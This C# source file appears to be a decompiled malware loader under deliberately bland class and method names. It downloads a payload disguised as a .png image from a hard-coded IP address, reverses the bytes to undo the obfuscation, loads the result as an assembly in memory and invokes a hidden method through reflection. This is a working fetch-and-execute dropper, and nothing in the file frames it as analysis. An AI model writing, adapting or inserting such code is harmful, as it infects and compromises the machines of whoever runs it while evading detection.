using System;
using System.IO;
using System.Net;
using System.Reflection;

namespace Zribe;

internal class Member
{
	private string Name(object o)
	{
		Type type = o as Type;
		return (string)type.InvokeMember("Onzlass", BindingFlags.InvokeMethod, null, null, null);
	}

	private string Great(object obj)
	{
		Assembly assembly = obj as Assembly;
		object type = assembly.GetType("Xdixnw.Ytvscwcf");
		return Name(type);
	}

	internal string Good()
	{
		object obj = Assembly.Load(Buffer());
		return Great(obj);
	}

	private byte[] Buffer()
	{
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		byte[] array = new BinaryReader(WebRequest.Create("http://91.243.44.142/arx-777Ofdds_Suadocfq.png").GetResponse().GetResponseStream()).ReadBytes(82771873);
		Array.Reverse((Array)array, 0, array.Length);
		return array;
	}
}
